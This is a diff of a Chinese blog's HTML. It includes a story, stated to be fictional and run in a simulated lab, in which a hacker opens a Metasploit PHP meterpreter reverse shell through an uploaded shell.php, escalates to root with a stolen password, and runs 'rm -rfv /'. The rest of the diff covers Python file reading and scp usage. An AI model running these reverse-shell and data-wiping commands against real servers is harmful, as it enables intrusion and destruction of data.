+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;msf5 exploit(multi/handler) &amp;gt; set LHOST 192.168.0.109
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;msf5 exploit(multi/handler) &amp;gt; set LPORT 4444
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;set payload php/meterpreter/reverse_tcp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后一步就是运行模块了，&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;msf5 exploit(multi/handler) &amp;gt; run
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后 msf 开始监听。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;
 [*] Started reverse TCP handler on 192.168.0.109:4444 
 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这时他将提示出的文件地址和链接改一下，并访问&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这时他将提示出的文件地址和链接改一下，并访问&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&lt;code&gt;http://192.168.0.116/upload/shell.php&lt;/code&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;msf 立刻就有了结果，可想而知，服务器的安全措施有多差&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[*] Started reverse TCP handler on 192.168.0.109:4444 
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;[*] Started reverse TCP handler on 192.168.0.109:4444 
 [*] Sending stage (38288 bytes) to 192.168.0.116
 [*] Meterpreter session 1 opened (192.168.0.109:4444 -&amp;gt; 192.168.0.116:52350) at 2020-09-26 21:33:06 +0800
 
 meterpreter &amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;现在他开始获取系统简要信息&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在他开始获取系统简要信息&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;系统、内核版本&lt;/li&gt;
 &lt;/ul&gt;
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; sysinfo
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;meterpreter &amp;gt; sysinfo
 Computer    : localhost
 OS          : Linux localhost 2.6.32-754.33.1.el6.x86_64 #1 SMP Tue Aug 25 15:29:40 UTC 2020 x86_64
 Meterpreter : php/linux
 meterpreter &amp;gt; cat /etc/issue
 CentOS release 6.10 (Final)
 Kernel \r on an \m
-&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
 &lt;li&gt;当前控制的用户权限&lt;/li&gt;
 &lt;/ul&gt;
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getuid
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;meterpreter &amp;gt; getuid
 Server username: apache (48)
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;权限还是很低的，尽管无法做一些让公司损失大的事情，但至少能够偷窥和搞破坏了，不过黑客会就此满足吗？ 答案是不会，因为他还想要提权，获取 root 权限，这样便能为所欲为了。&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;权限还是很低的，尽管无法做一些让公司损失大的事情，但至少能够偷窥和搞破坏了，不过黑客会就此满足吗？ 答案是不会，因为他还想要提权，获取 root 权限，这样便能为所欲为了。&lt;/p&gt;
 &lt;p&gt;由于这台服务器的系统与内核过于老旧，大多数复现漏洞的代码要么只在3.x 以上的内核版本中有效，要么无法编译。&lt;/p&gt;
 &lt;p&gt;看起来他需要想想其他办法。&lt;/p&gt;
 &lt;p&gt;他在白天骑着摩托穿街过巷送外卖，夜晚则是游走网络间的黑客。&lt;/p&gt;
@@ -139,33 +564,33 @@ Server username: apache (48)
 &lt;p&gt;趁着员工们用餐，他用手机偷偷将便签拍了下来便离开了。&lt;/p&gt;
 &lt;p&gt;比较巧的是，这张便签是刚换的密码，需要再隔一段时间才会更改。&lt;/p&gt;
 &lt;p&gt;下班后回到终端，尝试着用偷窥来的密码直接登陆 root&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; shell
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;meterpreter &amp;gt; shell
 Process 1376 created.
 Channel 2 created.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获得交互 shell&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;/bin/sh -i
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;获得交互 shell&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;/bin/sh -i
 sh: no job control in this shell
-sh-4.1$ python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
-python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
+sh-4.1$ python -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;
+python -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;
 bash-4.1$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;进行登录&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;bash-4.1$ su root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;进行登录&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;bash-4.1$ su root
 su root
 Password: ************
 
 [root@localhost upload]# 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可见，一口气便登录成功，root 权限到了他的手里。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[root@localhost upload]# whoami
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可见，一口气便登录成功，root 权限到了他的手里。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;[root@localhost upload]# whoami
 whoami
 root
 [root@localhost upload]# id
 id
 uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0
 [root@localhost upload]# 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来他便可以为所欲为了..&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来他便可以为所欲为了..&lt;/p&gt;
 &lt;p&gt;对，他最后进行了删库&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[root@localhost upload]# rm -rfv /
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最后导致公司损失巨大..&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;[root@localhost upload]# rm -rfv /
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后导致公司损失巨大..&lt;/p&gt;
 &lt;h2 id=&#34;结语&#34;&gt;结语&lt;/h2&gt;
 &lt;p&gt;虽然以上的故事纯属虚构，攻击也只是在模拟环境进行的。&lt;/p&gt;
 &lt;p&gt;但却值得我们思考，就我们能看到的来看&amp;hellip;&lt;/p&gt;
@@ -232,76 +657,76 @@ uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0
 &lt;/blockquote&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;以一个文件举例&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;/home/weepingdogel/test.txt
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;/home/weepingdogel/test.txt
 ---
 Hello!I love Python.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们不写 mode 参数：&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们不写 mode 参数：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test.txt&amp;#39;&lt;/span&gt;)
 &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read())
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行后：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;weepingdogel@WeepingDogel ~&amp;gt; python test.py
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;weepingdogel@WeepingDogel ~&amp;gt; python test.py
 Hello!I love Python.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们将它加上：&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们将它加上：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test.txt&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rt&amp;#39;&lt;/span&gt;)
 &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read())
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行后：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;weepingdogel@WeepingDogel ~&amp;gt; python test.py
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;weepingdogel@WeepingDogel ~&amp;gt; python test.py
 Hello!I love Python.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;结果是一模一样的。&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果是一模一样的。&lt;/p&gt;
 &lt;h4 id=&#34;读行&#34;&gt;读行&lt;/h4&gt;
 &lt;p&gt;文件:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;/home/weepingdogel/test.txt
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;/home/weepingdogel/test.txt
 ---
 Hello!I love Python.
 Have a nice day!
 Good luck!
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当我们遇到一个多行文件的时候，我们可以选择只读取它其中一行
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当我们遇到一个多行文件的时候，我们可以选择只读取它其中一行
 &lt;code&gt;f.readline()&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;例如:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test.txt&amp;#39;&lt;/span&gt;)
 &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;readline())
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行后：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;weepingdogel@WeepingDogel ~&amp;gt; python test.py
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;weepingdogel@WeepingDogel ~&amp;gt; python test.py
 Hello!I love Python.
 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们需要两行的时候：&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们需要两行的时候：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test.txt&amp;#39;&lt;/span&gt;)
 &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;readline())
 &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;readline())
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行后：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;weepingdogel@WeepingDogel ~&amp;gt; python test.py
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;weepingdogel@WeepingDogel ~&amp;gt; python test.py
 Hello!I love Python.
 
 Have a nice day!
 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果我们需要三行：&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果我们需要三行：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test.txt&amp;#39;&lt;/span&gt;)
 &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;readline())
 &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;readline())
 &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;readline())
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行后：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;weepingdogel@WeepingDogel ~&amp;gt; python test.py
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;weepingdogel@WeepingDogel ~&amp;gt; python test.py
 Hello!I love Python.
 
 Have a nice day!
 
 Good luck!
 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个用法它会逐行读取，并且打印输出的时候是会换行的&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个用法它会逐行读取，并且打印输出的时候是会换行的&lt;/p&gt;
 &lt;p&gt;在读配置文件的时候也许会用到吧&amp;hellip;&lt;/p&gt;
 &lt;p&gt;当然我们也可以用 &lt;code&gt;for&lt;/code&gt; 循环读一次性读全部：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test.txt&amp;#39;&lt;/span&gt;)
 &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; f:
     &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(x)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行后：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;weepingdogel@WeepingDogel ~&amp;gt; python test.py
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;weepingdogel@WeepingDogel ~&amp;gt; python test.py
 Hello!I love Python.
 
 Have a nice day!
 
 Good luck!
 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我觉得用 &lt;code&gt;for&lt;/code&gt; 应该更有效率点&amp;hellip;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我觉得用 &lt;code&gt;for&lt;/code&gt; 应该更有效率点&amp;hellip;&lt;/p&gt;
 &lt;h3 id=&#34;关闭文件&#34;&gt;关闭文件&lt;/h3&gt;
 &lt;p&gt;这个没什么好讲的&amp;hellip;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test.txt&amp;#39;&lt;/span&gt;)
@@ -415,11 +840,11 @@ sign()
 &lt;p&gt;我们用 &lt;code&gt;ssh&lt;/code&gt; 操作服务器，当我们需要给服务器传输文件的时候，&lt;code&gt;scp&lt;/code&gt; 命令会通过 &lt;code&gt;ssh&lt;/code&gt; 的端口进行文件传输。&lt;/p&gt;
 &lt;h2 id=&#34;用法&#34;&gt;用法&lt;/h2&gt;
 &lt;p&gt;当我们在终端输入 &lt;code&gt;scp&lt;/code&gt; 后，我们会得到这些&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;weepingdogel@WeepingDogel ~&amp;gt; scp
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;weepingdogel@WeepingDogel ~&amp;gt; scp
 usage: scp [-346BCpqrTv] [-c cipher] [-F ssh_config] [-i identity_file]
             [-J destination] [-l limit] [-o ssh_option] [-P port]
             [-S program] source ... target
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;很显然我们很快就知道了一些参数&amp;hellip;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;很显然我们很快就知道了一些参数&amp;hellip;&lt;/p&gt;
 &lt;h2 id=&#34;示例&#34;&gt;示例&lt;/h2&gt;
 &lt;p&gt;这里举一些例子，来展示清楚具体的使用方法&amp;hellip;&lt;/p&gt;
 &lt;p&gt;先说明一下我的测试环境&lt;/p&gt;
@@ -430,47 +855,47 @@ usage: scp [-346BCpqrTv] [-c cipher] [-F ssh_config] [-i identity_file]
 &lt;p&gt;IP: 192.168.0.108&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h3 id=&#34;上传一个文件&#34;&gt;上传一个文件&lt;/h3&gt;
-&lt;pre&gt;&lt;code&gt;$ scp [本地文件名] 用户名@地址:[文件名]
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这是一般用法，但是&lt;strong&gt;请确保路径正确！&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ scp [本地文件名] 用户名@地址:[文件名]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这是一般用法，但是&lt;strong&gt;请确保路径正确！&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;即：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;weepingdogel@WeepingDogel ~ [1]&amp;gt; scp ./编译/7.1.0.zip root@192.168.0.108:/root/
-root@192.168.0.108&#39;s password: 
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;weepingdogel@WeepingDogel ~ [1]&amp;gt; scp ./编译/7.1.0.zip root@192.168.0.108:/root/
+root@192.168.0.108&amp;#39;s password: 
 7.1.0.zip                                                    100%   95KB   5.2MB/s   00:00 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个很简单的，没什么多说的了..&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个很简单的，没什么多说的了..&lt;/p&gt;
 &lt;h3 id=&#34;下载一个文件&#34;&gt;下载一个文件&lt;/h3&gt;
 &lt;p&gt;如果我们要从服务器里取一个文件下来修改，而服务器没有 &lt;code&gt;ftp&lt;/code&gt; 时该怎么办呢？&lt;/p&gt;
 &lt;p&gt;我们需要用 SSH 去找到这个文件的位置，不过这个就不详写了，与主题无关。（总之你知道文件的位置就可以了）&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ scp 用户名@地址:[文件名] [本地文件名]
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;还是要提醒一下，这个&lt;strong&gt;文件名&lt;/strong&gt;， &lt;strong&gt;是一个路径！&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ scp 用户名@地址:[文件名] [本地文件名]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还是要提醒一下，这个&lt;strong&gt;文件名&lt;/strong&gt;， &lt;strong&gt;是一个路径！&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;是一个&lt;strong&gt;相对路径&lt;/strong&gt;或&lt;strong&gt;绝对路径&lt;/strong&gt;！具体依情况而定，但&lt;strong&gt;它一定是个路径！&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;如：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;weepingdogel@WeepingDogel ~&amp;gt; scp root@192.168.0.108:/root/index.html /tmp/index.html
-root@192.168.0.108&#39;s password: 
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;weepingdogel@WeepingDogel ~&amp;gt; scp root@192.168.0.108:/root/index.html /tmp/index.html
+root@192.168.0.108&amp;#39;s password: 
 index.html                                                   100%   46KB 728.6KB/s   00:00
 weepingdogel@WeepingDogel ~&amp;gt; ls /tmp/*.html -lh
 -rw-r--r-- 1 weepingdogel weepingdogel 47K  9月  5 20:54 /tmp/index.html
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;只需要知道文件在服务器的具体位置以及想好保存到本地的一个位置就可以了&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只需要知道文件在服务器的具体位置以及想好保存到本地的一个位置就可以了&lt;/p&gt;
 &lt;h3 id=&#34;指定一个-ip&#34;&gt;指定一个 IP&lt;/h3&gt;
 &lt;p&gt;一般情况下 SSH 的端口都是 22，那是真的云服务器或者一些有公网 IP 的服务器。&lt;/p&gt;
 &lt;p&gt;而上文写的是基于局域网中的文件传输，我们需要内网穿透才能远程文件传输，但内网穿透在一般情况下都是指定一个别的端口来给 SSH 建立一个通道，因此端口就不再是 22 了。&lt;/p&gt;
 &lt;p&gt;我这里用的是 &lt;a href=&#34;https://www.natfrp.com/&#34;&gt;SakuraFRP&lt;/a&gt; ，非常好用的免费内网穿透服务！&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;上传：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;scp -P [端口]  [本地文件名] 用户名@地址:[文件名]
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;下载：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;scp -P [端口] 用户名@地址:[文件名] [本地文件名]
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上面已经提示过很多次&lt;strong&gt;这个&lt;code&gt;[文件名]&lt;/code&gt;是个路径了&lt;/strong&gt;。这里就不再多废话啦。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;scp -P [端口]  [本地文件名] 用户名@地址:[文件名]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;下载：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;scp -P [端口] 用户名@地址:[文件名] [本地文件名]
